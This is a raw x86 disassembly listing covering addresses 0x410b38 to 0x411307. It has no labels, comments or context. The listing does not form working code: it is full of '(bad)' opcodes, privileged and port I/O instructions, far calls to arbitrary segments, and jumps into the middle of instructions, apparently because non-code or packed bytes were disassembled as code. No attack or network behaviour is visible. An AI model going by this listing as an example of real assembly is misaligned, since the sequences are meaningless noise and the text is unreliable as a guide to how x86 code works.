  410b38:	arpl   WORD PTR [ecx],ax
  410b3a:	mov    dl,0x67
  410b3c:	mov    ds:0xc677d3ba,eax
  410b41:	jmp    0x410b04
  410b43:	int    0xf9
  410b45:	(bad)  
  410b47:	fimul  WORD PTR ds:0x77eefddf
  410b4d:	jmp    FWORD PTR [ecx-0x21]
  410b50:	mov    esi,0x703fdf7d
  410b55:	loopne 0x410b17
  410b57:	pop    ds
  410b58:	push   cs
  410b59:	sbb    al,0x38
  410b5b:	jo     0x410b4f
  410b5d:	lds    edx,FWORD PTR [edi]
  410b5f:	pop    edi
  410b60:	hlt    
  410b61:	cli    
  410b62:	std    
  410b63:	(bad)  
  410b64:	loopne 0x410b53
  410b66:	mov    bh,0xdf
  410b68:	jle    0x410b47
  410b6a:	imul   ch
  410b6c:	fld    TBYTE PTR [edi-0x41]
  410b6f:	repz into 
  410b71:	cmp    esi,DWORD PTR [edi-0x6432194]
  410b77:	cli    
  410b78:	xor    eax,0x3f5cd66b
  410b7d:	cmp    BYTE PTR [eax],bh
  410b7f:	call   0x275458b9
  410b84:	dec    edi
  410b85:	sahf   
  410b86:	int3   
  410b87:	in     al,dx
  410b88:	(bad)  [edi-0x7038f811]
  410b8e:	pop    ds
  410b8f:	aas    
  410b90:	add    ah,BYTE PTR [eax+0x44dafea7]
  410b96:	loop   0x410b7f
  410b98:	inc    edx
  410b99:	or     esi,DWORD PTR [esp+eax*1]
  410b9c:	pop    ecx
  410b9d:	adc    DWORD PTR [esi+0x6201b93],ecx
  410ba3:	or     BYTE PTR [ecx+0x59cec1ac],ch
  410ba9:	push   esi
  410baa:	imul   eax,ecx,0x4a
  410bad:	bound  eax,QWORD PTR [eax]
  410baf:	gs inc ebp
  410bb1:	push   ecx
  410bb2:	ror    BYTE PTR [edx+0x436a44a2],cl
  410bb8:	jge    0x410bd3
  410bba:	dec    ebp
  410bbb:	inc    ecx
  410bbc:	inc    eax
  410bbd:	out    dx,al
  410bbe:	xor    edx,edx
  410bc0:	dec    ebx
  410bc1:	sub    eax,DWORD PTR es:[ecx+0x43e9618]
  410bc8:	xor    al,bl
  410bca:	push   0x3ebd5ae4
  410bcf:	out    dx,eax
  410bd0:	pop    esi
  410bd1:	inc    edi
  410bd2:	inc    edi
  410bd3:	xchg   DWORD PTR ds:0xde452720,esi
  410bd9:	imul   ecx,DWORD PTR [eax-0x1b],0xf9893264
  410be0:	stc    
  410be1:	jns    0x410ba7
  410be3:	jecxz  0x410c56
  410be5:	retf   
  410be6:	pop    esp
  410be7:	jae    0x410ba2
  410be9:	pop    esp
  410bea:	call   0xafc1f4d7
  410bef:	xchg   BYTE PTR [edi-0x140a053],ch
  410bf5:	scas   eax,DWORD PTR es:[edi]
  410bf6:	jecxz  0x410be9
  410bf8:	clc    
  410bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bfa:	retf   
  410bfb:	xchg   edi,eax
  410bfc:	das    
  410bfd:	daa    
  410bfe:	or     eax,DWORD PTR [ebp+0x2a54ba42]
  410c04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c05:	push   edi
  410c06:	scas   eax,DWORD PTR es:[edi]
  410c07:	pop    esi
  410c08:	sbb    eax,0x1b86e1be
  410c0d:	(bad)  
  410c0e:	fbstp  TBYTE PTR [ebp-0x29]
  410c11:	pop    ebp
  410c12:	aaa    
  410c13:	fbstp  TBYTE PTR [ebp-0x29]
  410c16:	pop    ebp
  410c17:	pop    ebx
  410c18:	sub    BYTE PTR [ebx-0x70],dh
  410c1b:	add    al,0x9f
  410c1d:	call   0x2244:0xbfbc6913
  410c24:	adc    ecx,0xc9f1d1d1
  410c2a:	leave  
  410c2b:	leave  
  410c2c:	aas    
  410c2d:	mov    WORD PTR [esp+ecx*4-0x2c58b2e4],cs
  410c34:	xor    esi,esi
  410c36:	ror    BYTE PTR [ebx+0x68],cl
  410c39:	add    al,0xf3
  410c3b:	inc    esp
  410c3c:	aas    
  410c3d:	pop    edi
  410c3e:	aam    0xfa
  410c40:	retf   
  410c41:	adc    edx,edi
  410c43:	and    eax,0xef77bfc2
  410c48:	fisubr WORD PTR [edi-0xc462312]
  410c4e:	pop    ds
  410c4f:	sub    al,bl
  410c51:	addr16 div ecx
  410c54:	mov    bl,BYTE PTR [edi]
  410c56:	ds jge 0x410c09
  410c59:	cmp    al,0x2a
  410c5b:	sub    eax,0x79e2fc7e
  410c60:	add    BYTE PTR [esi-0x69c8d094],dl
  410c66:	inc    eax
  410c67:	mov    al,0xb
  410c69:	loopne 0x410c7c
  410c6b:	rcl    edx,0x77
  410c6e:	inc    ecx
  410c6f:	inc    esp
  410c70:	rol    BYTE PTR [edi+0x16],0x12
  410c74:	arpl   WORD PTR [edx+eiz*1],cx
  410c77:	sbb    eax,esi
  410c79:	arpl   WORD PTR [esi-0x49],bp
  410c7c:	fcmovne st,st(2)
  410c7e:	out    0x34,al
  410c80:	or     al,0xc3
  410c82:	dec    edx
  410c83:	cld    
  410c84:	mov    ds:0x6f4c87ef,al
  410c89:	push   0xd
  410c8b:	enter  0x72e5,0xe8
  410c8f:	jmp    0x9314:0x4e5a92ea
  410c96:	mov    al,ds:0x2972001c
  410c9b:	mov    DWORD PTR [eax],eax
  410c9d:	cmp    BYTE PTR [ecx],dl
  410c9f:	nop
  410ca0:	xchg   ebp,eax
  410ca1:	push   eax
  410ca2:	sub    dl,BYTE PTR [ebp-0x391c8e50]
  410ca8:	fistp  DWORD PTR [esi+0x7f89e278]
  410cae:	(bad)  
  410caf:	jmp    0x2ffb8c03
  410cb4:	sbb    cl,BYTE PTR [ebp+0x152a56ce]
  410cba:	push   edi
  410cbb:	cs xchg edi,eax
  410cbd:	ror    DWORD PTR [edi+0x7232391c],cl
  410cc3:	in     al,0xc8
  410cc5:	xchg   ecx,eax
  410cc6:	mov    eax,ds:0x67ecfd9f
  410ccb:	out    dx,al
  410ccc:	pusha  
  410ccd:	xor    BYTE PTR [eax],bl
  410ccf:	mov    eax,0xfedbb6ed
  410cd4:	jmp    0x81e:0xde6f9be6
  410cdb:	add    al,0xd6
  410cdd:	sbb    eax,0xddf47a3d
  410ce2:	xchg   ebx,eax
  410ce3:	daa    
  410ce4:	dec    edi
  410ce5:	push   ds
  410ce6:	add    edx,eax
  410ce8:	leave  
  410ce9:	(bad)  
  410cea:	outs   dx,DWORD PTR ds:[esi]
  410ceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cec:	lds    edi,FWORD PTR [edx+0x20b2db8]
  410cf2:	repnz add BYTE PTR [ecx],ah
  410cf5:	daa    
  410cf6:	add    DWORD PTR [edx+0x49],esi
  410cf9:	test   eax,0xa40cb72c
  410cfe:	pop    eax
  410cff:	popa   
  410d00:	ja     0x410d62
  410d02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d03:	adc    al,0x45
  410d05:	fld    st(0)
  410d07:	std    
  410d08:	jg     0x410d24
  410d0a:	adc    al,0x94
  410d0c:	(bad)  
  410d0d:	push   0x1f6a00b2
  410d12:	fwait
  410d13:	imul   esi,DWORD PTR [ebp+0x16],0x86c20ca2
  410d1a:	sti    
  410d1b:	shr    al,1
  410d1d:	pop    ecx
  410d1e:	pop    ss
  410d1f:	push   cs
  410d20:	xchg   DWORD PTR [ebp-0x6054a48a],ebp
  410d26:	mov    eax,0x37799b5a
  410d2b:	push   ds
  410d2c:	(bad)  
  410d2d:	arpl   WORD PTR [edx+0x62],sp
  410d30:	add    ch,BYTE PTR [ecx-0x75dd35ac]
  410d36:	pusha  
  410d37:	xor    BYTE PTR [eax+0x608c3870],cl
  410d3d:	xor    BYTE PTR [eax-0x717bd7b0],cl
  410d43:	mov    cs,WORD PTR [esi]
  410d45:	xchg   edi,eax
  410d46:	iret   
  410d47:	out    0xb,eax
  410d49:	add    DWORD PTR [eax+0x5ecd9b3e],edi
  410d4f:	pop    edi
  410d50:	out    dx,eax
  410d51:	cmc    
  410d52:	addr16 mov eax,0xc3c2eedd
  410d58:	(bad)  
  410d5a:	in     al,dx
  410d5b:	jmp    0x410d48
  410d5d:	jmp    0x410d52
  410d5f:	add    al,0x83
  410d61:	inc    ecx
  410d62:	js     0x410d21
  410d64:	pop    esi
  410d65:	retf   
  410d66:	(bad)  
  410d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d68:	in     al,0x90
  410d6a:	(bad)
  410d6d:	dec    esp
  410d6e:	dec    esi
  410d6f:	dec    esi
  410d70:	and    bl,BYTE PTR [edx]
  410d72:	lea    esp,[edx]
  410d74:	push   ds
  410d75:	(bad)  
  410d76:	setge  BYTE PTR ds:0xd4c0f67b
  410d7d:	aam    0xd4
  410d7f:	inc    edi
  410d80:	xchg   BYTE PTR [ecx+0x64],ah
  410d83:	ror    BYTE PTR [eax],1
  410d85:	mov    ah,0x14
  410d87:	mov    al,0x34
  410d89:	call   0xf6fa:0x27d1976f
  410d90:	mov    ds:0xf024df7f,al
  410d95:	in     al,dx
  410d96:	std    
  410d97:	push   esi
  410d98:	imul   ebp
  410d9a:	(bad)  [edi-0x29]
  410d9d:	sbb    eax,0xdbf1dc77
  410da2:	bound  esi,QWORD PTR [ecx-0x3524ebe8]
  410da8:	jmp    0xd7286a04
  410dad:	adc    edi,edi
  410daf:	xchg   ebp,eax
  410db0:	xchg   ebp,eax
  410db1:	adc    DWORD PTR [edi+0x333c32f3],ecx
  410db7:	iret   
  410db8:	mov    es,WORD PTR [eax+edi*8+0x39]
  410dbc:	push   esi
  410dbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dbe:	ins    DWORD PTR es:[edi],dx
  410dbf:	pop    edx
  410dc0:	sbb    bh,al
  410dc2:	cmp    ah,BYTE PTR [ebp+0x156f35f]
  410dc8:	cli    
  410dc9:	pop    esi
  410dca:	mov    eax,0x81922cff
  410dcf:	sbb    eax,0x11d59039
  410dd4:	or     BYTE PTR [edx+ebx*4],al
  410dd7:	fmul   QWORD PTR [edi]
  410dd9:	dec    ebp
  410dda:	rcl    DWORD PTR [eax-0x326e9933],cl
  410de0:	xchg   cx,ax
  410de2:	leave  
  410de3:	mov    al,fs:0x7a7a0a28
  410de9:	jp     0x410d97
  410deb:	cli    
  410dec:	xchg   ecx,eax
  410ded:	push   ebp
  410dee:	inc    ecx
  410def:	push   ecx
  410df0:	jns    0x410e20
  410df2:	hlt    
  410df3:	je     0x410d91
  410df5:	aas    
  410df6:	sbb    edi,DWORD PTR [ecx-0x653bbfe]
  410dfc:	jl     0x410e1c
  410dfe:	pop    ebx
  410dff:	mov    dh,0x6c
  410e01:	fprem1 
  410e03:	les    edx,FWORD PTR [ebx]
  410e05:	dec    edi
  410e06:	cld    
  410e07:	(bad)  
  410e08:	daa    
  410e09:	lahf   
  410e0a:	jl     0x410dfe
  410e0c:	jnp    0x410d99
  410e0e:	mov    ecx,DWORD PTR [ebx-0x1d56e5e6]
  410e14:	(bad)  
  410e15:	push   0xffffffb5
  410e17:	push   0x68
  410e19:	call   0xc2ec:0x763b1e66
  410e20:	mov    cl,0x63
  410e22:	(bad)  
  410e23:	ds scas al,BYTE PTR es:[edi]
  410e25:	push   edi
  410e27:	push   ds
  410e28:	aam    0x84
  410e2a:	lahf   
  410e2b:	imul   esi,DWORD PTR [edi+0x51],0xffffffd3
  410e2f:	mov    eax,DWORD PTR [eax+eax*1]
  410e32:	sub    al,0xd
  410e34:	adc    BYTE PTR [edx+0x3245f9a],cl
  410e3a:	xor    DWORD PTR [eax],ebp
  410e3c:	dec    eax
  410e3d:	push   ss
  410e3e:	add    eax,edx
  410e40:	add    BYTE PTR [esi+edx*2],0x44
  410e44:	add    BYTE PTR [edx-0x4cb75b5e],cl
  410e4a:	mov    eax,DWORD PTR [ecx-0x41]
  410e4d:	fidiv  DWORD PTR [esi-0x5c99a13f]
  410e53:	ror    DWORD PTR [esi],cl
  410e55:	mov    ch,0xa1
  410e57:	sbb    eax,DWORD PTR [esi+0x1b1bb561]
  410e5d:	xchg   BYTE PTR [ecx-0x173c790],al
  410e63:	(bad)  
  410e64:	jle    0x410e51
  410e66:	pop    fs
  410e68:	mov    dl,0xe5
  410e6a:	jb     0x410e85
  410e6c:	mov    ds:0x1b18a3a3,eax
  410e71:	sbb    eax,DWORD PTR [ebx-0x4a]
  410e74:	ds ret 0x9d0c
  410e78:	dec    ebx
  410e79:	cmp    edx,esp
  410e7b:	fs and eax,edx
  410e7e:	pop    ds
  410e7f:	scas   eax,DWORD PTR es:[edi]
  410e80:	jmp    0x410efc
  410e82:	jge    0x410e32
  410e84:	sti    
  410e85:	push   cs
  410e86:	test   bl,al
  410e88:	popa   
  410e89:	or     al,0xc
  410e8b:	or     al,0xb8
  410e8d:	cmp    bh,BYTE PTR [edx]
  410e8f:	cmp    al,BYTE PTR [edx-0x55]
  410e92:	push   edi
  410e93:	scas   eax,DWORD PTR es:[edi]
  410e94:	inc    esi
  410e95:	xor    BYTE PTR [eax],bl
  410e97:	test   bh,bl
  410e99:	out    dx,eax
  410e9a:	xchg   DWORD PTR [ecx+0x18],esp
  410e9d:	dec    ebp
  410e9e:	int    0x79
  410ea0:	xchg   edi,eax
  410ea1:	cs pop ebp
  410ea3:	inc    edx
  410ea4:	cmp    al,0x1e
  410ea6:	(bad)  
  410ea7:	cld    
  410ea8:	cld    
  410ea9:	jl     0x410f25
  410eab:	push   0xbe5e868
  410eb0:	pop    ss
  410eb1:	cs mov esp,0xe20dad5d
  410eb7:	inc    ecx
  410eb8:	das    
  410eb9:	xchg   edi,eax
  410eba:	int3   
  410ebb:	jns    0x410f07
  410ebd:	ficom  DWORD PTR [ecx]
  410ebf:	xor    eax,0x12000f3e
  410ec4:	fist   DWORD PTR [edx+0x699a2f9f]
  410eca:	mov    ds:0xbfaf83f0,al
  410ecf:	repnz retf 0xa12b
  410ed3:	dec    eax
  410ed4:	and    al,0xf2
  410ed6:	mov    edi,0x2e0b4d34
  410edb:	(bad)  
  410edc:	in     al,dx
  410edd:	xchg   edi,eax
  410ede:	sbb    eax,0xb10723b3
  410ee3:	mov    esp,0x49103dcc
  410ee8:	ret    0x22ce
  410eeb:	loopne 0x410e8a
  410eed:	mov    edx,0x86113f68
  410ef2:	cwde   
  410ef3:	inc    ebp
  410ef4:	mov    DWORD PTR [ebx-0x2071ab7e],0x45030793
  410efe:	xor    ah,BYTE PTR [eax]
  410f00:	rcl    DWORD PTR [ebx],0x5b
  410f03:	sub    BYTE PTR [edi+edx*4-0x55faa33a],ch
  410f0a:	pop    ss
  410f0b:	dec    ebp
  410f0c:	xlat   BYTE PTR ds:[ebx]
  410f0d:	push   esi
  410f0e:	sub    dl,BYTE PTR [ebp-0x539b3670]
  410f14:	sub    al,0xcd
  410f16:	dec    eax
  410f17:	and    al,0x62
  410f19:	inc    ebp
  410f1a:	loop   0x410f95
  410f1c:	inc    edx
  410f1d:	xchg   edx,eax
  410f1e:	push   0x89598945
  410f23:	push   esp
  410f24:	addr16 dec esi
  410f26:	adc    BYTE PTR [ebp-0x2914febe],al
  410f2c:	lods   eax,DWORD PTR ds:[esi]
  410f2d:	mov    ebx,0x9dcee77e
  410f32:	pop    edi
  410f33:	cmp    BYTE PTR [esi-0x14],dh
  410f36:	fdivr  DWORD PTR [edi+0x43cc96a3]
  410f3c:	add    al,BYTE PTR [edi-0x3e]
  410f3f:	inc    edi
  410f40:	and    esi,DWORD PTR [edi]
  410f42:	mov    edi,DWORD PTR [esi-0x118e27c2]
  410f48:	fcomi  st,st(3)
  410f4a:	outs   dx,DWORD PTR ds:[esi]
  410f4b:	or     DWORD PTR [ebx],0xffffffb0
  410f4e:	mov    dl,dh
  410f50:	fisttp WORD PTR [esi]
  410f52:	mov    edi,0xbf37bf2f
  410f57:	pop    ds
  410f58:	inc    ecx
  410f59:	dec    edx
  410f5a:	add    cl,bl
  410f5c:	add    BYTE PTR es:[ebp-0x29],bl
  410f60:	stos   DWORD PTR es:[edi],eax
  410f61:	add    BYTE PTR [edx-0x66e44892],dl
  410f67:	dec    esp
  410f68:	sbb    dh,BYTE PTR [ebx-0x1417cc4d]
  410f6e:	jmp    0x410f77
  410f70:	dec    ebp
  410f71:	(bad)  
  410f73:	call   0x2b25b9a
  410f78:	mov    ch,0x69
  410f7a:	ds je  0x410f1b
  410f7d:	jle    0x410f68
  410f7f:	jbe    0x410f3c
  410f81:	inc    ecx
  410f82:	cmp    eax,0xb82cf8e8
  410f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f88:	push   edx
  410f89:	or     ecx,edx
  410f8b:	push   0x93939314
  410f90:	pop    eax
  410f91:	pop    eax
  410f92:	pop    eax
  410f93:	and    BYTE PTR [ebx],dh
  410f95:	shr    DWORD PTR [eax],1
  410f97:	xchg   edi,eax
  410f98:	retf   
  410f99:	fiadd  WORD PTR cs:[esi+edx*2]
  410f9d:	lods   eax,DWORD PTR ds:[esi]
  410f9e:	push   esi
  410f9f:	push   ecx
  410fa0:	sub    bh,bl
  410fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fa3:	mov    al,0x32
  410fa5:	add    BYTE PTR [eax],al
  410fa7:	pop    ss
  410fa8:	jae    0x410ff3
  410faa:	inc    esp
  410fab:	inc    ecx
  410fac:	push   esp
  410fad:	xchg   ebp,eax
  410fae:	lods   al,BYTE PTR ds:[esi]
  410faf:	aas    
  410fb0:	xchg   ebp,eax
  410fb1:	xor    al,0x3b
  410fb3:	cdq    
  410fb4:	jae    0x410ff4
  410fb6:	lahf   
  410fb7:	(bad)  
  410fb9:	jge    0x411038
  410fbb:	push   esi
  410fbc:	add    al,BYTE PTR [esi-0x5d4a1429]
  410fc2:	retf   0x2f97
  410fc5:	pop    edi
  410fc6:	inc    esi
  410fc7:	cmp    bl,BYTE PTR [ebp+0x8c8c8c6]
  410fcd:	es daa 
  410fcf:	daa    
  410fd0:	jae    0x410f83
  410fd2:	pop    eax
  410fd3:	in     al,dx
  410fd4:	call   0xec3200c9
  410fd9:	cdq    
  410fda:	dec    esp
  410fdb:	es (bad) 
  410fdd:	pop    esi
  410fde:	stos   BYTE PTR es:[edi],al
  410fdf:	lods   al,BYTE PTR ds:[esi]
  410fe0:	int    0x5e
  410fe2:	(bad)  
  410fe3:	mov    WORD PTR [edi+0x66],es
  410fe6:	mov    esi,0xb2abdc18
  410feb:	imul   ebx,ecx,0x6a
  410fee:	jl     0x410fee
  410ff0:	jle    0x411035
  410ff2:	mov    eax,ds:0x4d340fd0
  410ff7:	mov    ebx,0xdbeb4ed9
  410ffc:	or     DWORD PTR [ebx+ebp*1-0x15],esp
  411000:	and    BYTE PTR [eax],0x5b
  411003:	xchg   edi,eax
  411004:	jge    0x410fee
  411006:	jbe    0x410fee
  411008:	mov    dl,0x78
  41100a:	or     eax,0x36ad4d00
  41100f:	rcl    BYTE PTR [edx+0x4b],0x0
  411013:	push   0x49ae0b26
  411018:	inc    ebp
  411019:	bound  esp,QWORD PTR [eax]
  41101b:	ret    0x3221
  41101e:	and    BYTE PTR [edi-0x6f],dl
  411021:	xchg   esp,eax
  411022:	push   es
  411023:	iret   
  411024:	rcl    BYTE PTR [ebx],1
  411026:	sti    
  411027:	loopne 0x41109c
  411029:	mov    ds:0xfdfb7ba0,al
  41102e:	jle    0x41105b
  411030:	sbb    esi,DWORD PTR [eax-0x2ca6d5ac]
  411036:	mov    eax,0xeb51baf1
  41103b:	adc    al,0xd5
  41103d:	inc    ecx
  41103e:	and    al,0x2a
  411040:	dec    esi
  411041:	fs cld 
  411043:	xchg   edi,eax
  411044:	xchg   esp,eax
  411045:	fiadd  WORD PTR [ebx-0x1f07c1f1]
  41104b:	jnp    0x41103c
  41104d:	mov    ebp,0xf9acc477
  411052:	rcl    BYTE PTR [ebp+ecx*8-0x1332d3f9],0x3
  41105a:	call   0xe40a:0xe02e03bf
  411061:	or     al,BYTE PTR [edx+0x50864d62]
  411067:	sahf   
  411068:	scas   al,BYTE PTR es:[edi]
  411069:	and    eax,0xb2686c4e
  41106e:	jae    0x411018
  411070:	or     bl,BYTE PTR ds:[edx+0x358e8749]
  411077:	popa   
  411078:	inc    ebp
  411079:	jecxz  0x41107c
  41107b:	mov    esp,0xcfdbf6fd
  411080:	out    dx,eax
  411081:	fnstsw WORD PTR [ebx+0x52a57777]
  411087:	jmp    0x8b78bc9
  41108c:	pop    ebp
  41108d:	pop    ebp
  41108e:	fnstsw WORD PTR [eax-0x14c4310d]
  411094:	xchg   ecx,eax
  411095:	stc    
  411096:	jb     0x41102b
  411098:	or     esp,DWORD PTR [eax+0x47db5aa]
  41109e:	push   0xffffffe7
  4110a0:	and    eax,0xccb4a501
  4110a5:	jp     0x4110c1
  4110a7:	sub    eax,0x31676766
  4110ac:	cmp    edi,DWORD PTR [ebx]
  4110ae:	mov    ebp,DWORD PTR [esi+esi*1+0xb]
  4110b2:	push   ebp
  4110b3:	push   ebp
  4110b4:	xchg   ecx,eax
  4110b5:	leave  
  4110b6:	fs (bad) 
  4110b8:	sbb    BYTE PTR [edi+0x72e74fc7],cl
  4110be:	mov    ecx,0xfd358004
  4110c3:	std    
  4110c4:	std    
  4110c5:	ja     0x41104b
  4110c7:	inc    edx
  4110c8:	mov    eax,ds:0x478f1e4d
  4110cd:	imul   ecx,DWORD PTR [ebp+ecx*2-0x13],0x22002269
  4110d5:	cmp    esi,0x4a947efe
  4110db:	and    eax,0x981e3c78
  4110e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110e1:	mov    DWORD PTR [edx+ebp*1-0x7b],edx
  4110e5:	push   esp
  4110e6:	sub    al,BYTE PTR [ebp+0xa119191]
  4110ec:	lock lea ecx,[edi+ecx*1]
  4110f0:	ud0    edi,DWORD PTR [esi+0x7e]
  4110f4:	jle    0x4110f4
  4110f6:	push   esp
  4110f7:	cs xchg edi,eax
  4110f9:	mov    esi,DWORD PTR [ebx+0x79cc813f]
  4110ff:	xchg   ecx,eax
  411100:	add    BYTE PTR [ecx+edx*8+0x7c],ah
  411104:	sar    al,cl
  411106:	bound  esi,QWORD PTR [edi+ebx*2]
  411109:	(bad)  
  41110a:	adc    al,0xd3
  41110c:	xor    ah,BYTE PTR [eax]
  41110e:	repz mov ebx,0x736efddf
  411114:	mov    eax,ds:0xb68c7850
  411119:	in     eax,dx
  41111a:	test   BYTE PTR [ecx+0x26],bl
  41111d:	fmul   st,st(3)
  41111f:	and    eax,0xd45d710a
  411124:	bnd jl 0x4110c2
  411127:	or     eax,DWORD PTR [esi-0x6f8fad18]
  41112d:	mov    al,ds:0x73168690
  411132:	jmp    DWORD PTR [ebp-0x5]
  411135:	leave  
  411136:	jl     0x41111f
  411138:	pop    ecx
  411139:	jbe    0x41119d
  41113b:	mov    ebp,0xd5af5ebc
  411140:	cld    
  411141:	inc    esi
  411142:	scas   al,BYTE PTR es:[edi]
  411143:	add    DWORD PTR [edi+0x410d0021],ecx
  411149:	in     al,0xf7
  41114b:	jecxz  0x411144
  41114d:	mov    eax,ds:0xe3c7b260
  411152:	pop    ecx
  411153:	adc    bl,BYTE PTR [ebx-0x7fb77a5e]
  411159:	xchg   ebx,eax
  41115a:	or     esi,DWORD PTR [edi+0x73f3f832]
  411160:	sub    esp,DWORD PTR [eax-0x389dd3a8]
  411166:	mov    ds,WORD PTR ds:0xf0fc3cf7
  41116c:	ret    
  41116d:	(bad)  
  41116f:	mov    edi,0xa8abff7f
  411174:	leave  
  411175:	xchg   ecx,eax
  411176:	popf   
  411177:	mov    ecx,0x310b340e
  41117c:	outs   dx,DWORD PTR ds:[esi]
  41117d:	mov    bl,0xe7
  41117f:	jle    0x4111bd
  411181:	and    BYTE PTR [edi],ah
  411183:	paddd  mm1,mm3
  411186:	lods   eax,DWORD PTR ds:[esi]
  411187:	add    cl,BYTE PTR [eax-0x36]
  41118a:	leave  
  41118b:	sub    al,0x9
  41118d:	xchg   edi,eax
  41118e:	jo     0x41113c
  411190:	jmp    0x1526db0
  411195:	dec    esp
  411196:	dec    ebp
  411197:	dec    ebp
  411198:	jge    0x411212
  41119a:	icebp  
  41119b:	loop   0x411162
  41119d:	push   DWORD PTR [edx-0x68492493]
  4111a3:	mov    eax,ebp
  4111a5:	mov    ds:0x873f3f3a,al
  4111aa:	shl    DWORD PTR [edi+0x2a54a14f],cl
  4111b0:	shr    edi,0xaf
  4111b3:	in     eax,0xd7
  4111b5:	jo     0x41122d
  4111b7:	scas   eax,DWORD PTR es:[edi]
  4111b8:	cmc    
  4111b9:	sbb    DWORD PTR [eax+0x73625cbd],ebp
  4111bf:	mov    al,ds:0xca6811a1
  4111c4:	sub    al,0xea
  4111c6:	enter  0xf53,0xc
  4111ca:	(bad)  
  4111cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111ce:	(bad)  
  4111cf:	mov    WORD PTR [ebp+0x2e507d8d],cs
  4111d5:	xchg   edi,eax
  4111d6:	dec    ebx
  4111d7:	cmc    
  4111d8:	cmp    cl,BYTE PTR [esi]
  4111da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111db:	push   edx
  4111dc:	test   eax,0xc89123f7
  4111e1:	xchg   dh,cl
  4111e3:	into   
  4111e4:	into   
  4111e5:	call   eax
  4111e7:	rcl    ebx,cl
  4111e9:	mov    bl,0xcb
  4111eb:	jmp    0x4111e2
  4111ed:	jbe    0x41123f
  4111ef:	xor    BYTE PTR [edi+0x72e5c008],al
  4111f5:	pop    ecx
  4111f6:	add    eax,DWORD PTR [ebx+0x78152a54]
  4111fc:	cmp    al,0x1e
  4111fe:	or     ch,dl
  411200:	popa   
  411201:	jl     0x41127f
  411203:	sbb    al,0xd1
  411205:	push   0x74747c74
  41120a:	je     0x41128b
  41120c:	sub    al,0x16
  41120e:	jnp    0x4111ef
  411210:	xor    al,0x4d
  411212:	sbb    cl,BYTE PTR [esi-0x8c74b77]
  411218:	in     eax,dx
  411219:	(bad)
  41121c:	mov    cl,0xd3
  41121e:	mov    gs,WORD PTR [ecx+ecx*1+0x28bd0b8f]
  411225:	call   0x85f23557
  41122a:	inc    edx
  41122b:	popa   
  41122c:	xchg   edi,eax
  41122d:	mov    ds:0xdc36d428,al
  411232:	push   esi
  411233:	js     0x4111e4
  411235:	aam    0x4a
  411237:	and    BYTE PTR [eax+0x3f18aebe],cl
  41123d:	adc    bl,bl
  41123f:	leave  
  411240:	stc    
  411241:	cmp    eax,0xe24a1e9a
  411246:	push   DWORD PTR [ebx+0x41]
  411249:	daa    
  41124a:	inc    ecx
  41124b:	adc    al,0x4d
  41124d:	imul   ebx,esi,0x933e2b9c
  411253:	sub    BYTE PTR [eax-0x284363cc],al
  411259:	jmp    0x411210
  41125b:	lods   al,BYTE PTR ds:[esi]
  41125c:	add    bl,BYTE PTR [ecx-0x12]
  41125f:	inc    ecx
  411260:	sub    eax,0xba68d4f3
  411265:	aas    
  411266:	call   DWORD PTR [esi]
  411268:	inc    ebp
  411269:	ret    0xcd10
  41126c:	jle    0x41121f
  41126e:	arpl   WORD PTR [edx],dx
  411270:	aas    
  411271:	(bad)  
  411272:	pop    ebx
  411273:	push   ds
  411274:	mov    WORD PTR [eax-0x6c],fs
  411277:	pop    es
  411278:	pop    ds
  411279:	jl     0x41126b
  41127b:	xchg   ecx,eax
  41127c:	aaa    
  41127d:	fidivr WORD PTR [eax-0x1d]
  411280:	push   eax
  411281:	test   eax,0x59a32a54
  411286:	xor    BYTE PTR [ecx+0x33b51696],bh
  41128c:	lods   eax,DWORD PTR ds:[esi]
  41128d:	fwait
  41128e:	push   0xeb5ccc2d
  411293:	mov    bh,0x13
  411295:	jp     0x411255
  411297:	cs jae 0x4112d3
  41129a:	test   al,0x4f
  41129c:	leave  
  41129d:	xchg   edx,eax
  41129e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41129f:	rcl    DWORD PTR ds:0xfbf4088f,0xdf
  4112a6:	(bad)  
  4112a7:	(bad)  
  4112a8:	(bad)  
  4112a9:	clc    
  4112aa:	jl     0x41126a
  4112ac:	popf   
  4112ad:	fwait
  4112ae:	ss ins DWORD PTR es:[edi],dx
  4112b0:	cli    
  4112b1:	mov    eax,ds:0x9998aaaa
  4112b6:	cdq    
  4112b7:	sub    DWORD PTR [edx+0x2a8508aa],0x40585858
  4112c1:	and    al,0x12
  4112c3:	mov    cl,0xcc
  4112c5:	jp     0x4112c1
  4112c7:	ds test al,0x59
  4112ca:	mov    BYTE PTR [esi+0x5e],bl
  4112cd:	ds lahf 
  4112cf:	(bad)  
  4112d0:	in     al,dx
  4112d1:	in     al,dx
  4112d2:	lods   al,BYTE PTR ds:[esi]
  4112d3:	aad    0x75
  4112d5:	mov    bh,0xce
  4112d7:	(bad)  
  4112d8:	leave  
  4112d9:	mov    edx,DWORD PTR [edi]
  4112db:	das    
  4112dc:	(bad)  
  4112dd:	es push ss
  4112df:	mov    ebx,DWORD PTR [ebp-0x70c28a2f]
  4112e5:	pop    edx
  4112e6:	jo     0x41126d
  4112e8:	xor    ch,ah
  4112ea:	push   eax
  4112eb:	lods   eax,DWORD PTR ds:[esi]
  4112ec:	push   esi
  4112ed:	mov    ecx,DWORD PTR [ebx+0x17678b8b]
  4112f3:	pop    ss
  4112f4:	pop    ss
  4112f5:	xchg   DWORD PTR [edx-0x313e1b37],edx
  4112fb:	into   
  4112fc:	into   
  4112fd:	pop    ebx
  4112fe:	and    dl,BYTE PTR [ecx+0x60c18dc8]
  411304:	jo     0x4112a1
  411306:	popa   
  411307:	sbb    BYTE PTR [esi+0x4a],bl
